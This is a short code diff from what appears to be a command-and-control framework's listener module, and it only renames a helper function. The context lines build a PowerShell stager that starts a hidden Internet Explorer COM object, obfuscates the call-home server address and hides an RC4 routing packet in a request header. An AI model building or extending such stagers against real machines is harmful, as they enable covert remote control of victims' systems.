@@ -256,7 +256,7 @@ class Listener(object):
                 b64RoutingPacket = base64.b64encode(routingPacket)
 
                 stager += "$ie=New-Object -COM InternetExplorer.Application;$ie.Silent=$True;$ie.visible=$False;$fl=14;"
-                stager += f"$ser={ data_util.obfuscate_call_home_address(host) };$t='{ stage0 }';"
+                stager += f"$ser={ helpers.obfuscate_call_home_address(host) };$t='{ stage0 }';"
 
                 # add the RC4 packet to a header location
                 stager += f'$c="{ requestHeader }: { b64RoutingPacket }'
